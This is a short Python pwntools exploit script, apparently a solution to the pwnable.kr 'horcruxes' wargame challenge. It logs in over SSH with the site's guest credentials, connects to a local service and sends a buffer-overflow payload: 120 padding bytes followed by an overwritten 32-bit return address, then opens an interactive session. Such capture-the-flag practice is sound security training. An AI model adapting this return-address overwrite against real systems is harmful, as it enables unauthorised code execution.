#!/usr/bin/env python3

from pwn import *





s = ssh(host="pwnable.kr", port=2222, user="horcruxes", password="guest")
io = s.run('nc 0 9032')



io.recvline()
io.recvline()
io.recvline()

io.write(b'1')


payload = flat([
	b'A'*120,
	p32(0x0804162a)
	])
print(payload)
io.write(payload)


io.interactive()